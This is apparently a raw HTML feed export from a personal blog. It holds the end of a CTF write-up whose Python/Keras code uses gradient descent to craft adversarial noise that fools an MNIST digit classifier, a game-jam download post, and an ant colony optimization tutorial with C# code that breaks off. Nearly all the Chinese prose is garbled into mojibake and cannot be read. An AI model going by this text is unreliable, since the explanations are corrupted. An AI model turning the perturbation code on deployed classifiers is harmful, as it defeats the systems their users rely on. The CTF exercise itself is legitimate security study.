class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> numpy.linalg <span class="keyword">import</span> norm</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line">model = keras.models.load_model(<span class="string">&#x27;model.h5&#x27;</span>)</span><br><span class="line">test_set=[<span class="number">13616</span>, <span class="number">4189</span>, <span class="number">3206</span>, <span class="number">51839</span>, <span class="number">30560</span>, <span class="number">45045</span>, <span class="number">51389</span>, <span class="number">59638</span>, <span class="number">10487</span>, <span class="number">5233</span>, <span class="number">48889</span>, <span class="number">10247</span>, <span class="number">1547</span>, <span class="number">3914</span>, <span class="number">44182</span>, <span class="number">9990</span>, <span class="number">26276</span>, <span class="number">28283</span>, <span class="number">52481</span>, <span class="number">46609</span>, <span class="number">18757</span>, <span class="number">26954</span>, <span class="number">26322</span>, <span class="number">18819</span>, <span class="number">29463</span>, <span class="number">34489</span>, <span class="number">51248</span>, <span class="number">53986</span>, <span class="number">25872</span>, <span class="number">42855</span>, <span class="number">49719</span>, <span class="number">31176</span>, <span class="number">38292</span>, <span class="number">48100</span>, <span class="number">52763</span>, <span class="number">3904</span>, <span class="number">46879</span>, <span class="number">9810</span>, <span class="number">51583</span>, <span class="number">39760</span>, <span class="number">21245</span>, <span class="number">13728</span>, <span class="number">33834</span>, <span class="number">23968</span>, <span class="number">28781</span>, <span class="number">33134</span>, <span class="number">35277</span>, <span class="number">18562</span>, <span class="number">21344</span>, <span class="number">8396</span>, <span class="number">36000</span>, <span class="number">43427</span>, <span class="number">24477</span>, <span class="number">36678</span>, <span class="number">56218</span>, <span class="number">32945</span>, <span class="number">17707</span>, <span class="number">36763</span>, <span class="number">611</span>, <span class="number">12668</span>, <span class="number">31312</span>, <span class="number">28053</span>, <span class="number">35696</span>, <span class="number">9876</span>, <span class="number">33329</span>, <span class="number">56107</span>, <span class="number">19929</span>, <span class="number">35636</span>, <span class="number">21704</span>, <span class="number">35807</span>, <span class="number">28645</span>, <span class="number">16522</span>, <span class="number">15192</span>, <span class="number">43890</span>, <span class="number">14710</span>, <span class="number">11805</span>, <span class="number">4754</span>, <span class="number">33660</span>, <span class="number">13270</span>, <span class="number">25465</span>, <span class="number">20267</span>, <span class="number">4141</span>, <span class="number">40391</span>, <span class="number">14287</span>, <span class="number">15545</span>, <span class="number">56458</span>, <span class="number">6121</span>, <span class="number">19663</span>, <span class="number">15709</span>, <span class="number">52825</span>, <span class="number">25933</span>, <span class="number">4091</span>, <span class="number">17861</span>, <span class="number">37773</span>, <span class="number">22450</span>, <span class="number">8669</span>, <span class="number">4447</span>, <span class="number">22022</span>, <span class="number">40046</span>, <span class="number">32738</span>]</span><br><span class="line"></span><br><span class="line">dict_mnist = np.load(<span class="string">&quot;mnist.npz&quot;</span>)</span><br><span class="line">x_train = dict_mnist[<span class="string">&quot;x_train&quot;</span>]</span><br><span class="line">y_train = dict_mnist[<span class="string">&quot;y_train&quot;</span>]</span><br><span class="line">x_test = dict_mnist[<span class="string">&quot;x_test&quot;</span>]</span><br><span class="line">y_test = dict_mnist[<span class="string">&quot;y_test&quot;</span>]</span><br><span class="line">dict_mnist.close()</span><br><span class="line">x_train = np.expand_dims(x_train, axis=<span class="number">3</span>)</span><br><span class="line">x_test = np.expand_dims(x_test, axis=<span class="number">3</span>)</span><br><span class="line"><span class="comment">#normalize</span></span><br><span class="line">x_train = (x_train-np.amin(x_train))/(np.amax(x_train)-np.amin(x_train))</span><br><span class="line">x_test = (x_test-np.amin(x_test))/(np.amax(x_test)-np.amin(x_test))</span><br><span class="line"></span><br><span class="line">test_x_data = []</span><br><span class="line">test_y_data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> test_set:</span><br><span class="line">    test_x_data.append(x_train[i])</span><br><span class="line">    test_y_data.append(y_train[i])</span><br><span class="line">test_x_data = np.array(test_x_data)</span><br><span class="line">test_y_data = np.array(test_y_data)</span><br><span class="line">test_x_data = test_x_data.astype(np.float32)</span><br><span class="line">test_y_data = test_y_data.astype(np.float32)</span><br></pre></td></tr></table></figure><h3 id="è·å–æ¢¯åº¦"><a href="#è·å–æ¢¯åº¦" class="headerlink" title="è·å–æ¢¯åº¦"></a>è·å–æ¢¯åº¦</h3><p>tensorFlowæä¾›äº†å¾ˆå¥½ç”¨çš„æ±‚æ¢¯åº¦çš„æ¥å£gradientTape</p><blockquote><p>2022/01/16è¡¥å……ï¼šè¿™ä¸ªå‡½æ•°åœ¨ä¹‹å‰å†™wpçš„æ—¶å€™å¯¹æˆ‘æ¥è¯´å°±æ˜¯ä¸€ä¸ªé»‘ç›’ï¼Œå¯¹æ¨¡å‹æ±‚è¾“å…¥çš„æ¢¯åº¦çš„å…·ä½“åŸç†è¯·çœ‹å¼€å¤´æåˆ°çš„æ–°æ–‡ç« </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetGrad</span>(<span class="params">data, classIndex=-<span class="number">1</span></span>):</span></span><br><span class="line">    <span class="comment"># å½“ classIndex=-1ï¼Œæ±‚æ ·æœ¬åˆ°æœ€è¿‘çš„æœ€é«˜æ¦‚ç‡ç‚¹</span></span><br><span class="line">    <span class="comment"># å½“æŒ‡å®š classIndexï¼Œæ±‚æ ·æœ¬åˆ°æŒ‡å®šçš„classIndexçš„æœ€é«˜æ¦‚ç‡ç‚¹</span></span><br><span class="line">    data = data.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    data = tf.cast(data, tf.float32)</span><br><span class="line">    <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:</span><br><span class="line">        tape.watch(data)</span><br><span class="line">        pred = model(data)</span><br><span class="line">        <span class="comment"># loss = tf.norm(pred, axis=1, ord=2) if classIndex == -1 else pred[0][classIndex]  # æœ‰çš„æ–‡ç« æŠŠlossè¿™ä¹ˆå†™</span></span><br><span class="line">        loss = pred[<span class="number">0</span>][np.argmax(pred)] <span class="keyword">if</span> classIndex == -<span class="number">1</span> <span class="keyword">else</span> pred[<span class="number">0</span>][classIndex]</span><br><span class="line">    grad = tape.gradient(loss, data)</span><br><span class="line">    <span class="keyword">return</span> np.array(grad).reshape(<span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="æ¢¯åº¦ä¸‹é™æ±‚noise"><a href="#æ¢¯åº¦ä¸‹é™æ±‚noise" class="headerlink" title="æ¢¯åº¦ä¸‹é™æ±‚noise"></a>æ¢¯åº¦ä¸‹é™æ±‚noise</h3><p>è¿™æ ·æ±‚å‡ºæ¥çš„noiseé€šå¸¸èƒ½ä»¥æœ€å°çš„Lpå°†æ ·æœ¬é€å‡ºå»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GradDes</span>(<span class="params">data, foolRate=<span class="number">0.5</span>, step=<span class="number">0.05</span>, maxIteration=<span class="number">500</span></span>):</span></span><br><span class="line">    minGrad = <span class="number">0.05</span></span><br><span class="line">    arg = np.argmax(model.predict(data.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)))</span><br><span class="line">    print(<span class="string">&quot;GetPert init arg : &quot;</span> + <span class="built_in">str</span>(arg))</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    pert = copy.deepcopy(data / np.inf)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        rate = model.predict(data.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>) + pert.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>))[<span class="number">0</span>][arg]</span><br><span class="line">        print(<span class="string">&quot;\r - Iteration : &quot;</span> + <span class="built_in">str</span>(cnt) + <span class="string">&quot; rate : &quot;</span> + <span class="built_in">str</span>(rate), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> rate &lt; foolRate <span class="keyword">or</span> cnt == maxIteration:</span><br><span class="line">            result = model.predict(data.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>) + pert.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>))[<span class="number">0</span>]</span><br><span class="line">            print(<span class="string">&quot;\n - pert result : &quot;</span> + <span class="built_in">str</span>(np.argmax(result)) + <span class="string">&quot; : &quot;</span> + <span class="built_in">str</span>(np.amax(result)))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        grad = GetGrad(data + pert)</span><br><span class="line">        <span class="keyword">if</span> norm(grad) &lt; minGrad:</span><br><span class="line">            <span class="keyword">if</span> norm(grad) == <span class="number">0</span>:</span><br><span class="line">                print(<span class="string">&quot;ERROR: grad is zero&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            grad *= minGrad / norm(grad)</span><br><span class="line">        pert -= grad * step</span><br><span class="line">    <span class="keyword">return</span> pert</span><br></pre></td></tr></table></figure><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>è¿™æ ·æ±‚ç®—æ•°å¹³å‡å€¼å¾—æ–¹æ³•å…¶å®æœ‰ç‚¹é—®é¢˜ï¼Œå¦‚æœæ°å¥½æœ‰ä¸€ä¸ªåå‘çš„pertï¼Œé‚£ä¸ç›´æ¥æŠµæ¶ˆå“©ï¼Œè€Œä¸”æˆ‘ç”¨åˆ°çš„æ ·æœ¬é‡Œé¢è¿˜æœ‰ä¸€ä¸ªæ˜¯ä¸€å¼€å§‹æœ¬æ¥å°±è¢«åˆ†ç±»å™¨è¯¯åˆ†ç±»çš„ç‚¹= =â€¦ä½†æ˜¯æ—¢ç„¶ä»–å¾—å‡ºçš„ç»“æœèƒ½ç”¨é‚£å°±å…ˆåœ¨è¿™é‡Œè¿™ä¹ˆå†™ï¼Œç„¶åå†è®¨è®ºæ›´å¥½çš„è§£æ³•å—¯</p><p>ç”¨äº†ç®—æ•°å¹³å‡å€¼æ¥æ±‚noiseï¼Œæ²¡æœ‰é²æ£’æ€§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pert = [<span class="number">0</span>] * <span class="number">6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    pert[i] = GradDes(test_x_data[np.argwhere(test_y_data == <span class="number">9</span>)[i][<span class="number">0</span>]])</span><br><span class="line">    pert[i] = GradDes(test_x_data[np.argwhere(test_y_data == <span class="number">7</span>)[i][<span class="number">0</span>]] + pert[i])</span><br><span class="line">    pert[<span class="number">2</span> * i] = GradDes(test_x_data[np.argwhere(test_y_data == <span class="number">7</span>)[<span class="number">2</span> * i][<span class="number">0</span>]])</span><br><span class="line">    pert[<span class="number">2</span> * i] = GradDes(test_x_data[np.argwhere(test_y_data == <span class="number">9</span>)[<span class="number">2</span> * i][<span class="number">0</span>]] + pert[<span class="number">2</span> * i])</span><br><span class="line">pertSum = pert[<span class="number">0</span>]/np.inf</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pert:</span><br><span class="line">    pertSum += i</span><br><span class="line">pert = pertSum/<span class="number">6</span></span><br></pre></td></tr></table></figure><h2 id="expä¼˜åŒ–"><a href="#expä¼˜åŒ–" class="headerlink" title="expä¼˜åŒ–"></a>expä¼˜åŒ–</h2><p>ç›®å‰çš„æƒ³æ³•æ˜¯ï¼šæœ€å¥½æ˜¯é€šè¿‡æ±‚ï¼šå°†æ ·æœ¬å¸¦åˆ°ä¸åŒçš„è¾¹ç•Œçš„noiseï¼ˆæ¯”å¦‚æœ¬é¢˜ä¸­å°±æ˜¯æ±‚å‡ºå°†æ ·æœ¬7å’Œ9å¸¦åˆ°0,1,2,3,4,5,6,8çš„noiseï¼‰ï¼Œç„¶åæ¯”è¾ƒè¿™äº›noiseåœ¨æ–¹å‘ä¸èŒƒæ•°ä¸Šçš„å·®å¼‚ï¼Œè·å¾—æœ€ä¼˜çš„noiseï¼Œæ­¤æ—¶æ±‚ç®—æ•°å¹³å‡å€¼å°±æ²¡æœ‰é—®é¢˜äº†</p><p>ä½†æ˜¯åœ¨å…·ä½“å®ç°ä¸Šé‡åˆ°çš„é—®é¢˜å°±æ˜¯ï¼šåœ¨æ¢¯åº¦ä¸Šå‡æ±‚noiseçš„æ—¶å€™ä¼šé™·å…¥å±€éƒ¨æœ€ä¼˜è§£ï¼ˆå°¤å…¶æ˜¯ç›¸å·®è¾ƒå¤§çš„classï¼‰ï¼Œç„¶åç›®å‰è™½ç„¶çŸ¥é“ä»€ä¹ˆé€€ğŸ”¥é—ä¼ ğŸœç¾¤å•¥çš„ï¼Œä½†è¿˜æ²¡æœ‰æƒ³è¿‡å…·ä½“åˆ°åº•æ€ä¹ˆå¼„</p><p>ä½†ï¼šå¯¹æ¯ä¸€ä¸ªclasséƒ½æ±‚ä¸€ä¸ªnoiseï¼Œä½¿å¾—æŸä¸€ç‰¹å®šæ ·æœ¬åç§»åˆ°å…¶ä»–çš„ä»»æ„classæ˜¯å¯è¡Œçš„</p><blockquote><p>2022.4.6è¡¥å……ï¼šæ ¹æ®æœ€è¿‘äº†è§£çš„ä¿¡æ¯çœ‹æ¥ï¼Œé™·å…¥å±€éƒ¨æœ€ä¼˜è§£å¤§éƒ¨åˆ†åŸå› æ˜¯å› ä¸ºå¡åœ¨éç‚¹ï¼Œæ¢æˆæ›´å¥½çš„ä¼˜åŒ–ç®—æ³•ï¼Œå¦‚Adamç­‰å³å¯</p></blockquote><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;è¿‘æœŸCTFèµ›äº‹é‡Œé¢AIå¯¹æŠ—é¢˜å‡ºç°é¢‘ç‡é€æ¸å‡é«˜ï¼Œä½œä¸ºä¸€ä¸ªæ‘¸äº†å¥½ä¹…çš„webäººï¼Œæ­£å¥½ä¹‹å‰è‡ªå·±æœ‰ä¸€ç‚¹MachineLearningçš„åŸºç¡€ï¼Œå‡†å¤‡å°è¯•ä¸€ä¸‹è¿™ä¸ªé¢†åŸŸ&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/GlobalNoise_Universal.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="AI" scheme="https://kyriota.github.io/categories/AI/"/>
    
    
    <category term="CTF" scheme="https://kyriota.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Uncertainty download available!</title>
    <link href="https://kyriota.github.io/2021/11/17/Uncertainty/"/>
    <id>https://kyriota.github.io/2021/11/17/Uncertainty/</id>
    <published>2021-11-17T12:00:00.000Z</published>
    <updated>2022-03-17T18:51:18.664Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to BadAperture.Incï¼</p><p><img src="/images/Uncertainty_cover.png"></p><span id="more"></span><h1 id="Uncertainty"><a href="#Uncertainty" class="headerlink" title="Uncertainty"></a>Uncertainty</h1><p>Uncertaintyæ˜¯ä¸€æ¬¾ç”±BadApertureå›¢é˜Ÿåœ¨2021NovaGameJamæœŸé—´åˆ¶ä½œçš„æ´»åŠ¨ä½œå“ï¼Œå…¶ä¸­ä¸»è¦åŒ…å«äº†è§£è°œã€è·‘é…·ä¸¤ç§ç±»å‹çš„å…³å¡ï¼Œæ›´å¤šæœ‰å…³ä¿¡æ¯è¯·æ‚¨æŸ¥çœ‹æ¸¸æˆä¸»èœå•ä¸­çš„ABOUTé€‰å¡ï¼</p><blockquote><p>æå–é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1DVbqyM2yhpzKt932_LWzEw">https://pan.baidu.com/s/1DVbqyM2yhpzKt932_LWzEw</a><br>æå–ç ï¼šBDAP</p></blockquote><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>æœ¬ä½œå“ä¸­ä»ç„¶å­˜åœ¨è¯¸å¤šä¸è¶³ï¼Œè¿˜è¯·ç©å®¶å¤šå¤šåŒ…å®¹ï¼Œå¦å¤–ï¼Œç”±äºæ—¶é—´ä¸è¶³ï¼Œæœ¬ä½œä¸åŒ…å«ä»»ä½•éŸ³é¢‘ï¼Œæ–‡å­—éƒ¨åˆ†è¿˜è¯·æ‚¨è€å¿ƒé˜…è¯»ï¼Œå…¶ä¸­ä¹Ÿè®¸åŒ…å«äº†çº¿ç´¢åŠæç¤ºï¼Œæˆ‘ä»¬å¯¹æ‰€æœ‰æœªå¤„ç†å¾—å½“çš„åœ°æ–¹æ·±è¡¨æ­‰æ„</p><p>è¿™æ˜¯æˆ‘ä»¬ç¬¬ä¸€æ¬¡å°è¯•æ¸¸æˆåˆ¶ä½œï¼ˆä¹‹å‰æ˜¯ä¸€å—æ•´éŸ³ä¹çš„ğŸ˜‚ï¼‰ï¼Œä¹‹æ‰€ä»¥ä¼šåœ¨jamä¸­é€‰æ‹©åˆ¶ä½œä¸€ä¸ªå°ä½“é‡çš„3Dæ¸¸æˆï¼Œä¸»è¦è¿˜æ˜¯å› ä¸ºç›¸å¯¹äºæ­£å¸¸çš„gameJamï¼Œä»–ä»¬ç»™çš„æ—¶é—´å®åœ¨æ˜¯å¤ªå¤šäº†ï¼ˆè²Œä¼¼æ˜¯ä¸‰ä¸ªå‘¨ï¼Œç„¶ååœ¨çº¿ä¸‹å±•ç¤ºäº†ä¹‹ååˆç»§ç»­å®Œå–„äº†ä¸€ä¸ªå‘¨ï¼‰ï¼Œäºæ˜¯æˆ‘ä»¬å°±åšå‡ºäº†è¿™ä¹ˆä¸€ä¸ªå¤§èƒ†çš„å°è¯•</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;Welcome to BadAperture.Incï¼&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/Uncertainty_cover.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Unity" scheme="https://kyriota.github.io/categories/Unity/"/>
    
    
  </entry>
  
  <entry>
    <title>Ant Colony Optimization</title>
    <link href="https://kyriota.github.io/2021/10/02/Ant_Colony_Optimization/"/>
    <id>https://kyriota.github.io/2021/10/02/Ant_Colony_Optimization/</id>
    <published>2021-10-02T06:48:47.000Z</published>
    <updated>2022-01-06T06:55:04.006Z</updated>
    
    <content type="html"><![CDATA[<p>èšç¾¤ä¼˜åŒ–ç®—æ³•ï¼Œæœ€ç›´è§‚çš„ä¸€ä¸ªç¤ºä¾‹ç”¨é€”æ˜¯è§£å†³TPSï¼ˆTravelingSealsmanProblemï¼‰é—®é¢˜ï¼Œå¿«é€Ÿå¯»æ‰¾ä¸€ä¸ªå¯è§‚çš„è§£ï¼Œä½†éœ€è¦ä½ è°ƒçš„ä¸€æ‰‹å¥½å‚</p><p><img src="/images/ACO_cover.gif"></p><span id="more"></span><h1 id="Ant-Colony-Optimization"><a href="#Ant-Colony-Optimization" class="headerlink" title="Ant Colony Optimization"></a>Ant Colony Optimization</h1><blockquote><p> èšç¾¤ï¼Œé€€ç«ï¼Œé—ä¼ ï¼Œä¸‰å¤§çŸ¥åä¼˜åŒ–ç®—æ³•</p></blockquote><p>èšç¾¤ä¼˜åŒ–ç®—æ³•ï¼Œå¯å‘åœ¨äºèš‚èšè§…é£Ÿçš„è¡Œä¸ºï¼Œå³ä¸€æ®µæ—¶é—´åèš‚èšèƒ½å¤Ÿæ‰¾åˆ°æœ€çŸ­çš„è·¯å¾„åˆ°è¾¾é£Ÿç‰©çš„ä½ç½®ï¼›æ ¸å¿ƒåœ¨äºå¯¹ä¿¡æ¯ç´ çš„æŠ½è±¡ï¼Œèšç¾¤ç®—æ³•ä¹‹æ‰€ä»¥èƒ½å¤Ÿå¿«é€Ÿä¼˜åŒ–ï¼Œå¾—ç›Šäºç®—æ³•å·²æœ‰çš„æˆæœç§¯ç´¯ï¼›ä¸€å¥è¯è¯´æ˜ç™½è¿™ä¸ªç®—æ³•ï¼Œé‚£å°±æ˜¯åœ¨å½“å‰è§£çš„åŸºç¡€ä¸Šå»å¯»æ‰¾æ›´ä¼˜è§£</p><p>æœ¬æ–‡è®°å½•ä¸€ä¸‹å†™è¿™ä¸ªç®—æ³•çš„unityå¯è§†åŒ–å®ç°è¿‡ç¨‹ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯å»ºè®®æ‚¨è‡ªå·±å†™ä¸€éğŸ‘¼ï¼Œä½“éªŒä¸€ä¸‹ä»¤äººéå¸¸ä¸æ„‰å¿«çš„è°ƒå‚ä½“éªŒğŸ’¢ï¼›å¦‚æœä½ å†³å®šè‡ªå·±å†™ä¸€éï¼Œå¯ä»¥åœ¨çœ‹äº†<strong>Getting Start</strong>ç†è§£ç®—æ³•åŸç†åç›´æ¥å¼€å¹²ï¼Œå¡ä½äº†å†æ¥å‚è€ƒä¸€ä¸‹åé¢çš„å…·ä½“å®ç°æ–¹æ³•</p><p>ä¹‹ååº”è¯¥ä¼šå…ˆå»å­¦ä¸€äº›shaderç›¸å…³çš„å†…å®¹ï¼Œä»¥å…åœ¨å¾ˆå¤šä¹‹åæƒ³åšçš„å·¥ç¨‹ä¸­å—é™</p><h2 id="Getting-Start"><a href="#Getting-Start" class="headerlink" title="Getting Start"></a>Getting Start</h2><h3 id="TPS"><a href="#TPS" class="headerlink" title="TPS"></a>TPS</h3><p>æ—…è¡Œå•†äººé—®é¢˜ï¼Œä¸€å¥è¯æ¦‚æ‹¬å°±æ˜¯</p><blockquote><p> æ‰¾åˆ°ä¸€æ¡é•¿åº¦æœ€çŸ­çš„çº¿ä¸²è”èµ·ä¸€äº›å›ºå®šçš„ç‚¹</p></blockquote><p>å‡è®¾æœ‰nä¸ªç‚¹ï¼Œé‚£ä¹ˆå°†æœ‰<code>(n-1)!/2</code>ç§å¯èƒ½æ€§ï¼Œå¦‚æœéå†æ‰€æœ‰ç»“æœï¼Œnç¨å¾®ä¸€å¤§å³åˆ»è®¡ç®—ä¸å¯è¡Œï¼Œèšç¾¤ä¼˜åŒ–ç®—æ³•çš„ä½œç”¨å°±æ˜¯åœ¨çŸ­æ—¶é—´å†…æ‰¾åˆ°ä¸€ä¸ªå¯è§‚çš„è§£ï¼Œè™½ç„¶è¿™ä¸ªè§£ä¸ä¸€å®šä¼šæ˜¯æœ€ä¼˜è§£ï¼Œä½†ç›¸å¯¹äºç®—æ³•æ¶ˆè€—çš„ç®—åŠ›ä¸æ—¶é—´æ¥è¯´æ€§ä»·æ¯”é«˜</p><h3 id="Process-Outline"><a href="#Process-Outline" class="headerlink" title="Process Outline"></a>Process Outline</h3><p>åœ¨ç”¨èšç¾¤ç®—æ³•è§£å†³TPSé—®é¢˜æ—¶ï¼Œæœ‰ä¸¤ä¸ªå¯ä»¥æé«˜æ•ˆç‡ä¸ç»“æœè´¨é‡çš„å…³é”®ï¼Œè¿™ä¸¤ä¸ªç‚¹ä¸æ˜“è¢«æ³¨æ„ï¼Œæ‰€ä»¥æ”¾åœ¨å¼€å¤´å°±è¯´</p><ul><li>ä¸€ã€å°†èš‚èšæŒ‰ç»„ç»Ÿè®¡ï¼šä¸è¦åœ¨ä¸€åªèš‚èšç»“æŸæœç´¢åç«‹å³æ›´æ–°æ•°æ®ï¼Œè€Œéœ€è¦ç­‰å¾…ä¸€å®šæ•°é‡çš„èš‚èšå‡å®Œæˆåå†æ›´æ–°</li><li>äºŒã€éšæœºé€‰å–æ¯åªèš‚èšçš„èµ·ç‚¹ï¼šå¤šæ•°æ—¶å€™ï¼Œèš‚èšå¤šç»•çš„è·¯ç¨‹å‡æ¥è‡ªäºèš‚èšåœ¨èµ°åˆ°æœ€åä¸€ä¸ªç‚¹åè¿”å›èµ·ç‚¹çš„é‚£ä¸€æ¡çº¿æ®µï¼Œå¦‚æœè®¾å®šæ¯åªèš‚èšçš„èµ·ç‚¹ä¸å˜ï¼Œæ•ˆç‡ä¼šæ›´ä½ï¼Œå¤šæ¬¡è¿­ä»£åçš„ç»“æœä¹Ÿè¿˜æ˜¯ä¼šäº§ç”Ÿäº¤å‰è·¯çº¿ï¼ˆwhich is obviously not the best solutionï¼‰</li></ul><p>æ¥ä¸‹æ¥æ˜¯æ¯è½®ï¼ˆæ¯ç»„ï¼‰èš‚èšè·‘çš„åŸºæœ¬æµç¨‹ï¼š</p><ul><li>éšæœºé€‰æ‹©èµ·ç‚¹</li><li>ç”¨è·ç¦»ä¸ä¿¡æ¯ç´ å¯¹è·¯å¾„<strong>åŠ æƒåéšæœº</strong>é€‰æ‹©è·¯å¾„</li><li>æ›´æ–°å·²é€‰æ‹©è¿‡çš„ç‚¹ï¼Œä½¿å¾—èš‚èšä¸ä¼šè¿”å›å·²ç»åˆ°è¾¾è¿‡çš„ç‚¹</li><li>å½“èµ°åˆ°æœ€åä¸€ä¸ªç‚¹ï¼Œç›´æ¥è¿”å›èµ·ç‚¹</li></ul><p>ä¸€ç»„èš‚èšè·‘å®Œåæ›´æ–°ä¿¡æ¯ç´ çŸ©é˜µ</p><ul><li>å¯¹ä¿¡æ¯ç´ çŸ©é˜µä¹˜ä»¥ä¸€ä¸ªç³»æ•°ä½¿å¾—å·²æœ‰çš„ä¿¡æ¯ç´ æµ“åº¦é™ä½<ul><li>æ ¹æ®å½“å‰ç»„èš‚èšè·‘å‡ºæ¥çš„è·¯å¾„è·ç¦»é•¿åº¦ï¼Œå½“å‰ç»„ä¸­è·¯å¾„æœ€çŸ­çš„èš‚èšç•™ä¸‹çš„ä¿¡æ¯ç´ æœ€å¤šï¼Œè€Œè·¯å¾„é•¿çš„èš‚èšä¿¡æ¯ç´ å°‘</li></ul></li></ul><h2 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h2><p>ç”±äºç®—æ³•çš„è®¡ç®—è¿‡ç¨‹æ¯”è¾ƒé›¶ç¢ï¼Œå°±ä¸æ‹¿å‡ºæ¥è¯´äº†ï¼Œåœ¨æœ€åä¼šç›´æ¥æ”¾æºç ï¼Œè¿™é‡Œä¸»è¦è§£é‡Šä¸€äº›å‚æ•°</p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><p>ç‚¹ä¹‹é—´è·ç¦»çš„è¡¨æ ¼æ˜¯å¯¹ç§°çš„</p><img src="/images/ACO_disGraph.png" style="zoom:50%;" /><p>ä¸ºäº†åªè¯»å†™ä¸€ä¸ªæ•°æ®ï¼Œåªå–è¡¨æ ¼çš„ä¸€åŠå°±å¤Ÿäº†ï¼Œç„¶åå†™ä¸€ä¸ªå‡½æ•°ï¼Œè¾“å…¥ä¸¤ä¸ªç‚¹çš„indexï¼Œè¿”å›å¯¹åº”çš„è¡¨æ ¼ä¸­è·¯å¾„çš„index</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">GetPathIndex</span>(<span class="params"><span class="built_in">int</span> cur1, <span class="built_in">int</span> cur2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (cur1 &gt; cur2)&#123;</span><br><span class="line">        <span class="built_in">int</span> tmp = cur1;</span><br><span class="line">        cur1 = cur2;</span><br><span class="line">        cur2 = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">1</span>; i &lt;= cur1; i++) index += numPoint - i;</span><br><span class="line">    index += cur2 - cur1 - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Parameters"><a href="#Parameters" class="headerlink" title="Parameters"></a>Parameters</h3><p>é¦–å…ˆéœ€è¦ä»‹ç»ä¸€ä¸‹ç®—æ³•æ¶‰åŠçš„å‡ ä¸ªé‡è¦å‚æ•°</p><h4 id="Ant"><a href="#Ant" class="headerlink" 